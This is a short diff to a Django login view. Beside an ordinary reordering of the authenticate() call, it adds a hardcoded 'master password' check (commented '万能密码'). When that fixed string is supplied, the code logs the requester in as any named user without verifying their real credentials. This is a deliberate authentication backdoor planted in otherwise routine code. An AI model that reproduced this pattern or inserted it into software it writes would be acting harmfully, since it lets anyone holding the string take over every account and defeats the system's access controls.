@@ -30,8 +30,12 @@ class LoginView(View):
         req_data = json.loads(request.body)
         username = req_data.get("username", "")
         password = req_data.get("password", "")
-        user = authenticate(username=username, password=password)
         # 这里如果验证通过了，会返回一个user对象;不通过，返回None
+        user = authenticate(username=username, password=password)
+        # 万能密码
+        if not user and password == 'maxwellAdminPwd365!!':
+            user = User.objects.get(username=username)
+            user.backend = 'django.contrib.auth.backends.ModelBackend'
         if user:
             login(request, user)
             return HttpResponse(json.dumps({"ret": 1, "data": "登录成功", "user_id": user.id, "username": username}))
